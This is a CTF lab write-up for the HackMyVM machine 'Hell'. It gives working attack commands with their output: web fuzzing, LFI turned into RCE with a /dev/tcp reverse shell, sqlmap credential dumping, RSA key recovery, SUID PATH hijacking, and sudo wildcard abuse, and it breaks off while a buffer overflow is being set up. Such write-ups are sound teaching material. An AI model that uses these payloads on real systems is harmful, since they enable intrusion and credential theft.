# Hell

## Description

```bash
When booting the machine log in with the credentials: 
run:run 

And execute the command:
sudo run
```

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.187:21
Open 10.0.2.187:22
Open 10.0.2.187:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.187
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             256 Feb 16  2023 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.149
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 84:9f:33:ed:c5:e2:11:ff:20:7d:0e:d5:31:1a:f0:08 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKUt35mHiqmeX8Etve6CgCSeZwOi//weJtS6LhYQqYW+AVf/IFscFQ+TICAA6I3abQ5I9TU4n+/cBC1BiJydGbI=
|   256 b8:bc:0e:e3:84:af:21:ee:fb:cc:93:41:7d:9b:54:75 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILLBTRUCL9EquPItilTqvM8AEJIeAOJwUFCoN/1F23wL
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-title: 401 Unauthorized
Service Info: Host: 172.17.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## FTP

```bash
â””â”€$ ftp anonymous@10.0.2.187
Password: # NULL
ftp> ls -al
drwxr-xr-x    2 0        115          4096 Feb 16  2023 .
drwxr-xr-x    2 0        115          4096 Feb 16  2023 ..
-rw-r--r--    1 0        0              34 Feb 16  2023 .passwd
-rw-r--r--    1 0        0             256 Feb 16  2023 flag.txt
ftp> get flag.txt
226 Transfer complete.
ftp> get .passwd
226 Transfer complete.
ftp> put nmap_scan_10.0.2.187
550 Permission denied.
ftp> exit
221 Goodbye.
```

```bash
â””â”€$ cat flag.txt

â–„â–€â–ˆâ€ƒâ–ˆâ–„ â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–„ â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–„â–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆ â–ˆâ€ƒâ–ˆâ–€
â–ˆâ–€â–ˆâ€ƒâ–ˆ â–€â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆ â–€â–ˆâ€ƒ â–ˆ â€ƒâ–ˆ â–€ â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–„â–ˆ

Flag 1: HELL{4N0NYM0U5_15_7H3_B357_U53R}
```

```bash
â””â”€$ cat .passwd
The password is: webserver2023!
```

## HTTP

![writeup.png](/assets/pentest/hackmyvm/hell/writeup.png)

`ffuf` doesn't support authentication fuzzing, but `wfuzz` does
```bash
â””â”€$ wfuzz -u http://10.0.2.187/ -c -z file,/usr/share/seclists/Usernames/Names/names.txt --basic 'FUZZ:webserver2023!' --hc 401
000001083:   200        34 L     92 W       1386 Ch     "beilul"
```

![writeup-1.png](/assets/pentest/hackmyvm/hell/writeup-1.png)

### LFI

When using `/` or `..` characters it says `Attack detected`
```bash
â””â”€$ curl -su 'beilul:webserver2023!' 'http://10.0.2.187/index.php?profile=/' | htmlq h1 -t
Atack detected

â””â”€$ curl -su 'beilul:webserver2023!' 'http://10.0.2.187/index.php?profile=..' | htmlq h1 -t
Atack detected
```

```bash
â””â”€$ curl -su 'beilul:webserver2023!' 'http://10.0.2.187/index.php?profile=php://filter/convert.base64-encode/resource=index.php' | tail -1 | base64 -d | sed -n '/<?php/,/?>/p'
<?php
    $file = isset($_GET['profile']) ? $_GET['profile'] : 's4vitar.html';
    if (substr($file, 0, 1) !== "/" && substr($file, 0, 2) !== ".." && substr($file, 0,2) !== "./" ) {
        include($file);
    }
    else echo "<h1>Atack detected</h1>";
?>
```

```bash
â””â”€$ curl -su 'beilul:webserver2023!' 'http://10.0.2.187/index.php?profile=php://filter/resource=/etc/passwd' | grep -zPo '(?s)</html>\K.*' | grep -a sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
```

### RCE

I was not able to find log files that were readable
- [https://blog.1nf1n1ty.team/hacktricks/pentesting-web/file-inclusion#lfi2rce](https://blog.1nf1n1ty.team/hacktricks/pentesting-web/file-inclusion#lfi2rce)
- [https://blog.1nf1n1ty.team/hacktricks/pentesting-web/file-inclusion/lfi2rce-via-php-filters](https://blog.1nf1n1ty.team/hacktricks/pentesting-web/file-inclusion/lfi2rce-via-php-filters)

```bash
â””â”€$ php_filter_chain_generator --chain '<?=`$_REQUEST[0]`?>' | tail -1 > payload.txt
â””â”€$ curl -su 'beilul:webserver2023!' 'http://10.0.2.187/index.php?' -G --data-urlencode "profile=$(cat payload.txt)" --data-urlencode '0=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.149/4444 0>&1"'
---
â””â”€$ penelope -p 4444
www-data@860d79adc45f:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (txhaka)

Oh I guess intended way was to fuzz for files.
```bash
www-data@860d79adc45f:/var/www/html$ find . -type f -ls | grep -vE 'jpg|html'
   309201      4 -r-Sr--r--   1 root     www-data      184 Feb 16  2023 ./flag.txt
   309202      4 -rw-r--r--   1 root     root         1836 Feb 16  2023 ./index.php
   429180      4 -rw-r--r--   1 root     root           45 Feb 16  2023 ./.htpasswd

www-data@860d79adc45f:/var/www/html$ cat .htpasswd
beilul:$apr1$fLBy4Y1e$5pVNuSbmc9kil7JulXfQW0
```

```bash
â””â”€$ ffuf -u 'http://10.0.2.187/?profile=php://filter/resource=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -H 'Authorization: Basic YmVpbHVsOndlYnNlcnZlcjIwMjMh' -fs 1489
.htpasswd               [Status: 200, Size: 1534, Words: 85, Lines: 34, Duration: 122ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4530ms]
```

Oh maybe the LFI was not the intended way.
```powershell
PS > john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
Session completed
```

```bash
www-data@860d79adc45f:/var/www/html$ cat flag.txt

â–ˆ  â€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ€ƒâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ–€â–€
â–ˆâ–„â–„â€ƒâ–ˆâ–€ â€ƒâ–ˆâ€ƒâ–ˆâ–„â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ–ˆâ–„

Flag 3: HELL{LF1_F1LT7R_CH41N_G3N3R4T0R}
```

### Docker Container

```bash
www-data@860d79adc45f:/tmp$ wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh -q
www-data@860d79adc45f:/tmp$ chmod +x deepce.sh
www-data@860d79adc45f:/tmp$ ./deepce.sh
 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) by stealthcopter

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... www-data
[+] Groups .................. www-data
[+] Sudo .................... sudo not found
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ 860d79adc45f
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.17.0.2
[+] DNS Server(s) ........... 192.168.1.1
[+] Host IP ................. 172.17.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.15.0-60-generic
[+] Arch .................... x86_64
[+] CPU ..................... Intel(R) Core(TM) i7-5700HQ CPU @ 2.70GHz
[+] Useful tools installed .. Yes
/usr/bin/wget
/usr/bin/hostname
/usr/bin/python3
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh:	00000000a80425fb
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
> This can be decoded with: "capsh --decode=0000000000000000"
[+] SSHD Service ............ No
[+] Privileged Mode ......... Unknown
[+] Docker API exposed ...... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. No
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rwxr-xr-x 1 www-data www-data 41K Jan 12 14:05 /tmp/deepce.sh
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... No
[+] Hashes in shadow file ............... Not readable
[+] Searching for app dirs ..............
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the
host machine, this can be used to enumerate further

[+] Attempting ping sweep of 172.17.0.2 /24 (ping)
ping: ping: ping: ping: ping: ping: unsupported packet type: 1
ping: unsupported packet type: 1
unsupported packet type: 1
ping: unsupported packet type: 1
ping: unsupported packet type: 1unsupported packet type: 1

unsupported packet type: 1
ping: unsupported packet type: 1
unsupported packet type: 1
unsupported packet type: 1
==============================================================================================
```

Scan network
```bash
www-data@860d79adc45f:/tmp$ wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan -q
www-data@860d79adc45f:/tmp$ chmod +x fscan
www-data@860d79adc45f:/tmp$ ./fscan -h 172.17.0.2/24
(icmp) Target 172.17.0.1      is alive
(icmp) Target 172.17.0.2      is alive
(icmp) Target 172.17.0.3      is alive
```

Scan target
```bash
www-data@860d79adc45f:/tmp$ ./fscan -h 172.17.0.3 -no -nobr -nopoc -np -p 1-65535
172.17.0.3:22 open
172.17.0.3:80 open
```

### HTTP (Internal)

```bash
www-data@860d79adc45f:/tmp$ wget http://172.17.0.3 -qO-
...
<body class="align">
	<h1>Please update this</h1>
	<img src="https://http.cat/426" width="600">
	<h3>I have modified the application to only show if the sql query has been processed since a vulnerability has been detected and I prefer to pause it rather than let you see all the information.</h3>
</body>
...
```

```bash
www-data@860d79adc45f:/tmp$ wget http://172.17.0.3/admin -qO-
 <form action="index.php" method="get" style="background-color: #333; color: #fff;">
    <label for="id">User id:</label>
    <input type="text" id="id" name="id">
    <input type="submit" value="  Submit  ">
  </form><br>
```

```bash
www-data@860d79adc45f:/tmp$
[!] Session detached â‡² # Press F12
(Penelope)â”€(Session [1])> portfwd 10.0.2.149:8080<-172.17.0.3:80
[+] Setup Port Forwarding: 10.0.2.149:8080 <- 172.17.0.3:80
```

![writeup-2.png](/assets/pentest/hackmyvm/hell/writeup-2.png)

#### SQLi

```bash
â””â”€$ sqlmap -u 'http://10.0.2.149:8080/admin/index.php?id=*' -p 'id' --batch --dbms=MySQL --technique=B --level 5 --risk 3 --current-db
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: http://10.0.2.149:8080/admin/index.php?id=-2350' OR 3078=3078-- usDU
---
current database: 'example'
```

```bash
â””â”€$ sqlmap -u 'http://10.0.2.149:8080/admin/index.php?id=*' -p 'id' --batch --dbms=MySQL --technique=B --level 5 --risk 3 --dbs
available databases [3]:
[*] creds
[*] example
[*] information_schema
```

```bash
â””â”€$ sqlmap -u 'http://10.0.2.149:8080/admin/index.php?id=*' -p 'id' --batch --dbms=MySQL --technique=B --level 5 --risk 3 -D creds --dump
+-------------------+----------+
| password          | username |
+-------------------+----------+
| beltran48         | marco    |
| iamoswe2023!      | txhaka   |
| superrootpassword | root     |
+-------------------+----------+
```

## SSH (Internal Docker)

```bash
(Penelope)â”€(Session [1])> portfwd 10.0.2.149:2222<-172.17.0.3:22
[+] Setup Port Forwarding: 10.0.2.149:2222 <- 172.17.0.3:22
```

```bash
â””â”€$ sshpass -p 'iamoswe2023!' ssh txhaka@10.0.2.149 -p 2222
txhaka@56c6b89ad240:~$ id
uid=1000(txhaka) gid=1000(txhaka) groups=1000(txhaka)
txhaka@56c6b89ad240:~$ cat flag.txt

â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆ  â€ƒâ–ˆâ€ƒ â€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆ  â€ƒâ–ˆâ–€â–€â€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ–„ â–ˆ
â–„â–ˆâ€ƒâ–€â–€â–ˆâ€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ€ƒ â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ–ˆâ–„â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆ â–€â–ˆ

Flag 5: HELL{7H3_B00L34N_15_4150_4_VU1N}
```

> Creds: `txhaka:iamoswe2023!`
### Lateral Movement (root)

```bash
txhaka@56c6b89ad240:~$ su root
Password: superrootpassword
root@56c6b89ad240:/home/txhaka# id
uid=0(root) gid=0(root) groups=0(root)
```

> Creds: `root:superrootpassword`

```bash
root@56c6b89ad240:~# cat flag.txt

â–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–€â–ˆâ–€â€ƒ â€ƒ â€ƒ â€ƒ â€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ€ƒâ–ˆâ–„ â–ˆ
â–ˆâ–€â–„â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒ â–ˆ â€ƒâ–„â€ƒâ–„â€ƒâ–„â€ƒ â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ€ƒâ–ˆ â–€â–ˆ

Flag 6: HELL{7H3_5QL1_15_7H3_K3Y}
```

## Lateral Movement  (pascual)

```bash
root@56c6b89ad240:~# cat message.txt

From: pascualropi@hell.h4u

Hi, I have left ssh credentials in the .enc file, remember to decrypt it with your private rsa key :)
```

```bash
root@56c6b89ad240:~# find / -name '*.enc' -ls 2>/dev/null
    16067      0 -r--------   1 root     root           19 Jan 12 14:45 /sys/module/aesni_intel/sections/.rodata.cst16.enc
   547513      4 -rw-r--r--   1 root     root          129 Feb 16  2023 /root/creds/creds.enc
```

```bash
root@56c6b89ad240:~/creds# base64 -w0 creds.enc ;echo
AO7EECN14ajRTizqH8pIqzxMq4unKBlRHkyVPuCijuLVaSHyXXByJbqKqJcFxUvXw49iVhGKVPB7f8dkiBblWC8BY19qu3ZqwpPCHHA1vhSsnUVA9XHfWcPfT+yQ1DaRONbf4pDZCqsO6g/Tr8F2sjfH1rFsCzruznNegNTkady6
```

```python
from Crypto.PublicKey import RSA
from io import StringIO

PUBLIC_KEY = StringIO("""
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQGN24SSfsyl/rFafZuCr54a
BqEpk9fJDFa78Qnk177LTPwWgJPdgY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmB
jQh7jykg7N4FUC5dkqx4gBw+dfDfytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQop
lt34bxbXgVvJZUMfBFC6LQKBgQCkzWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl
2M6sE8sHiedfyQ4Hvro2yfkrMObcEZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw
2lpm81KVmMIG0oEHy9V8RviVOGRWi2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAML
UCV4ew==
-----END PUBLIC KEY-----
""".strip())

key = RSA.import_key(PUBLIC_KEY.read())
print(f'Key size: {key.size_in_bits()} bits')
print(f'\nPublic exponent: {key.e}')
print(f'\nModulus: {key.n}')
```

```bash
Key size: 1025 bits

Public exponent: 115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139

Modulus: 279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517
```

![writeup-3.png](/assets/pentest/hackmyvm/hell/writeup-3.png)

```python
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes
from base64 import b64decode

# 1. Provided Values
p = 13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083
q = 20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199
e = 115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139
n = p * q

# 2. Calculate Private Key components
phi = (p - 1) * (q - 1)
# d is the modular inverse of e modulo phi
d = pow(e, -1, phi)

# 3. Construct the RSA Private Key object
key = RSA.construct((n, e, d, p, q))

# 4. Load the encrypted data
ENCRYPTED_DATA_BLOB = 'AO7EECN14ajRTizqH8pIqzxMq4unKBlRHkyVPuCijuLVaSHyXXByJbqKqJcFxUvXw49iVhGKVPB7f8dkiBblWC8BY19qu3ZqwpPCHHA1vhSsnUVA9XHfWcPfT+yQ1DaRONbf4pDZCqsO6g/Tr8F2sjfH1rFsCzruznNegNTkady6'
encrypted_data = b64decode(ENCRYPTED_DATA_BLOB)

# 5. Decrypt the data
c = int.from_bytes(encrypted_data, "big")
m = pow(c, d, n)
print(long_to_bytes(m).decode(errors='ignore'))
```

```bash
Credentials for ssh in hell:

Username: pascual
Password: vulnwhatsapp123!
```

> Creds: `pascual:vulnwhatsapp123!`

```bash
â””â”€$ sshpass -p 'vulnwhatsapp123!' ssh pascual@10.0.2.187
pascual@hell:~$ id
uid=1004(pascual) gid=1004(pascual) groups=1004(pascual)
```

### User.txt

```bash
pascual@hell:~$ cat flag.txt
â–ˆâ–€â–ˆâ€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ–€â€ƒâ–ˆâ–€â–€â€ƒâ–ˆ â–ˆâ€ƒâ–„â–€â–ˆâ€ƒâ–ˆ  â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆ
â–ˆâ–€â–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–„â–ˆâ€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–ˆ

Flag 7: HELL{R54C7F7001_OR_M4NU41?}
```

## Privilege Escalation (eddie)

```bash
pascual@hell:~$ cat .bash_history | sort | uniq -c
      1 cat /var/mail/pascual
      2 cat flag.txt
      1 cd
      3 cd ..
      3 cd .ssh
      8 clear
      5 exit
     15 ls
      1 mkdir .ssh
      2 nano authorized_keys
      1 reports
      1 rm authorized_keys
```

```bash
pascual@hell:~$ cat /var/mail/pascual
From: eddiedota@hell.h4u

I have created a reports binary in /opt/reports/reports with which you can read the reports by passing an identifier as an argument to it
```

```bash
pascual@hell:/opt/reports$ ls -lah reports
-rwsr-xr-x 1 eddie eddie 16K Feb 16  2023 reports
```

Hm?...
```bash
pascual@hell:/opt/reports$ ./reports "1"
Vulnerability: A Local File Inclusion has been detected in one of our web servers.

pascual@hell:/opt/reports$ ./reports "11"
cat: /home/eddie/report/11: No such file or directory

pascual@hell:/opt/reports$ ./reports "111"
cat: /home/eddie/report/111: No such file or directory
```

Download and inspect
```bash
â””â”€$ sshpass -p 'vulnwhatsapp123!' scp pascual@10.0.2.187:/opt/reports/reports .
```

It's running our input through the `system`

![writeup-4.png](/assets/pentest/hackmyvm/hell/writeup-4.png)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, const char **argv) {
    int i;
    char *input_id;
    char command[104];

    // 1. Argument Check
    if (argc <= 1) {
        printf("\n\033[0;37m[\033[0;31m-\033[0;37m] Usage: %s <id for report>\n\n", argv[0]);
        return 0;
    }

    // 2. Privilege Escalation/Setting
    // 0x3EA = 1002 (The UID for user 'eddie')
    setreuid(1002, 1002);

    input_id = (char *)argv[1];

    // 3. Input Validation
    // Ensures every character in the provided ID is a digit (0-9)
    for (i = 0; i < strlen(input_id); ++i) {
        if ((unsigned int)(input_id[i] - '0') > 9) {
            printf("\n\033[0;37m[\033[0;31m-\033[0;37m] The input must be an identifier digit\n\n");
            return 1;
        }
    }

    // 4. Command Execution
    putchar('\n');
    
    // Construct the command: cat /home/eddie/report/<id>
    sprintf(command, "cat /home/eddie/report/%s", input_id);
    
    // Vulnerability Check: 
    // While sprintf is used, the 'for' loop above prevents classic shell injection 
    // by restricting input to digits only.
    system(command);
    
    putchar('\n');

    return 0;
}
```

```bash
pascual@hell:/tmp$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/eddieshell' > cat
pascual@hell:/tmp$ bash
pascual@hell:/tmp$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/eddieshell' > cat
pascual@hell:/tmp$ chmod +x cat
pascual@hell:/tmp$ PATH="$(pwd):$PATH" /opt/reports/reports 1
pascual@hell:/tmp$ ./eddieshell -p
eddieshell-5.1$ id
uid=1004(pascual) gid=1004(pascual) euid=1002(eddie) groups=1004(pascual)
```

```bash
â””â”€$ gen_ssh_deploy id_rsa eddie
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/eddie/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGobVZLm8b6z2ltKs1VpPceBE6Oit/7yK58QCLQ2mc0c woyag@kraken' >> /home/eddie/.ssh/authorized_keys; chmod 700 /home/eddie/.ssh; chmod 600 /home/eddie/.ssh/authorized_keys
```

```bash
â””â”€$ ssh -i id_rsa eddie@10.0.2.187
eddie@hell:~$ id
uid=1002(eddie) gid=1002(eddie) groups=1002(eddie)
```

```bash
eddie@hell:~$ cat flag.txt

â–ˆâ–€â–€â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–€â–ˆâ€ƒâ–€â–ˆâ–€â€ƒâ–„â–€â–ˆ
â–ˆâ–ˆâ–„â€ƒâ–ˆâ–„â–€â€ƒâ–ˆâ–„â–€â€ƒâ–ˆâ€ƒâ–ˆâ–ˆâ–„â€ƒâ–ˆâ–„â–€â€ƒâ–ˆâ–„â–ˆâ€ƒ â–ˆ â€ƒâ–ˆâ–€â–ˆ

Flag 8: HELL{R3L4T1V3_R0U735_4R3_FUN!}
```

## Privilege Escalation (ghost)

```bash
eddie@hell:/var/mail$ cat eddie
From: ghost@hall.h4u

Hi eddie, can you see my hacked facebook account, I leave you the last password I remember: MySuperSecurePassword123!
```

> Creds: `ghost:MySuperSecurePassword123!`

```bash
eddie@hell:/var/mail$ su ghost
Password: MySuperSecurePassword123!
ghost@hell:/var/mail$ id
uid=1001(ghost) gid=1001(ghost) groups=1001(ghost)

ghost@hell:~$ cat flag.txt

â–ˆâ–€â–ˆâ€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ–€â–€â€ƒâ–€â–„â–€â€ƒâ–ˆâ–€â–€â€ƒâ–ˆ â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â€ƒâ–€â–ˆâ–€
â–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€ â€ƒâ–ˆ â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–„â–ˆâ€ƒ â–ˆ

Flag 9: HELL{B14CKH47_H4CK3R_F4C3B00K_WTF?}

ghost@hell:~$ cat message.txt
From: gatogamer1155@hell.h4u

Hi ghost, just a heads up I created a script in node.js that converts text to hexadecimal, I'll leave it at my home directory for you to try, it's called hex.js :)
```

## Privilege Escalation (gato)

```bash
ghost@hell:~$ sudo -l
Matching Defaults entries for ghost on hell:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ghost may run the following commands on hell:
    (gato) /usr/bin/node /home/gato/*
```

```bash
ghost@hell:~$ sudo -u gato node /home/gato/hex.js
[*] Enter string: test
[+] String hexadecimal: 74657374

ghost@hell:~$ sudo -u gato node /home/gato/hex.js/../../../etc/passwd
/etc/passwd:1
root:x:0:0:root:/root:/bin/bash
SyntaxError: Unexpected token ':'
...
```

We can exploit the `*` wildcard and run any Javascript file with node as gato.
- [https://gtfobins.github.io/gtfobins/node/](https://gtfobins.github.io/gtfobins/node/)

```bash
ghost@hell:~$ echo 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})' > /tmp/gatoshell.js
ghost@hell:~$ sudo -u gato node /home/gato/hex.js/../../../tmp/gatoshell.js
gato@hell:/home/ghost$ id
uid=1000(gato) gid=1000(gato) groups=1000(gato)

gato@hell:~$ cat flag.txt

â–ˆâ–€â–€â€ƒâ–„â–€â–ˆâ€ƒâ–€â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ–€â–„â–€â–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–„â–ˆâ€ƒâ–„â–ˆâ€ƒâ–ˆâ–€â€ƒâ–ˆâ–€
â–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒ â–ˆ â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆ â–€ â–ˆâ€ƒâ–ˆâ–ˆâ–„â€ƒâ–ˆâ–€â–„â€ƒ â–ˆâ€ƒ â–ˆâ€ƒâ–„â–ˆâ€ƒâ–„â–ˆ

Flag 10: HELL{7H3_5UD03R5_15_N07_4_60D_1D34}
```

## Privilege Escalation (root)

The home directory has `gdb`/`peda` files, which means pwn... ðŸ˜­
```bash
gato@hell:~$ ls /opt/projects/strlen  -alh
-rwsr-xr-x 1 root root 13K Feb 15  2023 /opt/projects/strlen
```

```bash
â””â”€$ scp -i id_rsa gato@10.0.2.187:/opt/projects/strlen .
```

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

void overflow(const char *input) {
    char dest[256]; // Buffer size is 256 bytes
    printf("\n\033[0;37m[\033[0;34m*\033[0;37m] String: %s\n", input);
    printf("\n\033[0;37m[\033[0;32m+\033[0;37m] Length: %lu\n\n", strlen(input));

    // VULNERABILITY: strcpy does not check the length of the source string.
    // Any input longer than 256 bytes will overwrite the stack.
    strcpy(dest, input);
}

int main(int argc, const char **argv) {
    puts("\n");
    if (argc <= 1) {
        printf("\n\033[0;37m[\033[0;31m-\033[0;37m] Usage: %s <string>\n\n", argv[0]);
        return 0;
    }

    // Escalates privileges to root if the binary has the SUID bit set
    setuid(0);
    overflow(argv[1]);
    return 0;
}
```

```bash
â””â”€$ checksec --file strlen
Arch:       amd64-64-little   # 64-bit Linux binary using Little-Endian byte ordering.
RELRO:      Partial RELRO     # The GOT is writable; useful for "GOT Overwrite" attacks.
Stack:      No canary found   # No "cookie" to detect buffer overflows; stack smashing is easy.
NX:         NX unknown        # The "Never Execute" bit is absent; code can run from the stack.
PIE:        No PIE (0x400000) # No address randomization; the binary always loads at the same base address.
Stack:      Executable        # Confirms you can jump to and execute shellcode placed on the stack.
RWX:        Has RWX segments  # Memory exists that is simultaneously Readable, Writable, and Executable.
SHSTK:      Enabled           # Intel CET is present, but likely irrelevant if the other protections are off.
IBT:        Enabled 
Stripped:   No                # Symbols (like `main` and `vuln`) are visible, making debugging much easier.
```

Find offset of overflow
```bash
â””â”€$ pwndbg strlen
pwndbg> cyclic 400
aaaaa....aaaab
